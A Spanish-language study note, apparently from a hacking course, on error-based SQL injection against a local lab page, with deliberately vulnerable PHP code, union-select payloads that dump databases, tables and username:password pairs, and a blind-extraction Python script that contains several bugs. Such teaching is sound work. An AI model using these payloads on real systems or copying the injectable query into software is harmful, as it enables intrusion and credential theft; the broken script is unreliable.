------------------------
- Tags: #sql #sqli #basesdatos 
------------------------
# Definicion:
- **Inyección SQL basada en errores**: Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema.


- Codigo para detecion de SQLI Basada en Error
```php
<?php
    $server = "localhost";
    $username = "luisillo";
    $password = "luis123";
    $database = "H4ck4u";

    //Conexion a la BD
    $conn = new mysqli($server, $username, $password, $database);

    $id = $_GET['id'];

    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));

    $response =  mysqli_fetch_array($data);

    echo $response['username'];
?>
```

- Conocer numero de columnas 
```copy
http://localhost/searchUsers.php?id=1' order by 100-- -
```
Fuzzear Manual para averiguar numero de columnas.


- Despues jugamos con un **union select** numero-- -
```copy
http://localhost/searchUsers.php?id=98723123' union select 1-- -
```
Aqui en vez de usar un **id** que sabemos que SI existe, mejor usaremos un **id** que sabemos que NO  existe, y usamos **order by 1** en este caso, y sabremos que tenemos una columa,
por ejemplo si sabemos que tenemos 7 columnas usariamos un **union select 1,2,3,4,5,6,7-- -**
- #### El **order by** lo remplazamos mejor por un **union select** 


### Inyeccion:
- Aqui en este punto es cuando nos podemos realmente aprovechar de la inyeccion, ya que en vez de nosotros poner el *1*, podemos pasarle alguna Query que nos permita por ejemplo listar
 usuarios, contrasenas, bases de datos disponibles, etc.

- SQLI Ver Base De Datos en Uso:
```copy
http://localhost/searchUsers.php?id=98723123' union select database()-- -
```

- Ver Las Otras BD Existentes:
```copy
http://localhost/searchUsers.php?id=98723123' union select group_concat(schema_name) from information_schema.schemata-- -
```

- Para Una BD dada, ver sus **Tablas**:
```copy
http://localhost/searchUsers.php?id=98723123' union select group_concat(table_name) from information_schema.tables where table_schema='nombreBD'-- -
```

- Para Una BD dada, ver sus **Columnas**:
```copy
http://localhost/searchUsers.php?id=98723123' union select group_concat(column_name) from information_schema.columns where table_schema='nombreBD' and table_name='nombreTabla'-- -
```

En este caso suponiendo que tenemos como columnas **username** y **password**, podemos mostrarlas usando:
```copy
http://localhost/searchUsers.php?id=98723123' union select group_concat(username,password) from nombreBD.users-- -
```
### Podriamos usar:
```copy
http://localhost/searchUsers.php?id=98723123' union select group_concat(username,0x3a,password) from nombreBD.users-- -
```
Con en valor 0x3a, en valor hexa le indicariamos el valor **:** para que nos lo separe por dos puntos


```python3
 #!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import *


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1);
    
#CTRL + C
signal.signal(signal.SIGINT, def_handler)


#Variables  Globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status ("Iniciando Ataque...")

    time.sleep(2)

    p2.log.progress("Datos extraidos: ")

    extracted_info  = ""

    for position in range(1,50):
        for characters in range(33,126):
            sqli_url = main_url + "?id = 9 or (select(select ascci(substring(username, %d,1)) from users where id = 1)=%d" % (position, characters)

            p1.status(sqli_url)

            r = request.get(sqli_url)
     if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break     

				  
if __name__ == '__main__':
    makeSQLI()
       
```

